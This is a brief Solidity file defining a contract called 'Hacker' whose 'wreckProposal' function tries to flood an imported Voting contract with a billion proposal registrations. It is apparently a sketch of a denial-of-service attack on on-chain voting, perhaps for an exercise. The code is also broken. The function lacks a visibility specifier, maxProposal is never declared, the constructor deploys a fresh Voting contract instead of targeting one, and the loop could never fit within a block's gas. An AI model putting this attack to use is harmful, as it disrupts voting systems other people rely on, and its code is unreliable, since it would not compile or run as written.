// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
 
import './Voting.sol';

contract Hacker {

    Voting _votingContract;

    constructor(address _addr) {
        _votingContract = new Voting(_addr);
    }

    function wreckProposal() {
        maxProposal = 1000000000;
        for (uint i = 0 ; i < maxProposal; i++) {
            _votingContract.registerProposals(i);
        }
    }
}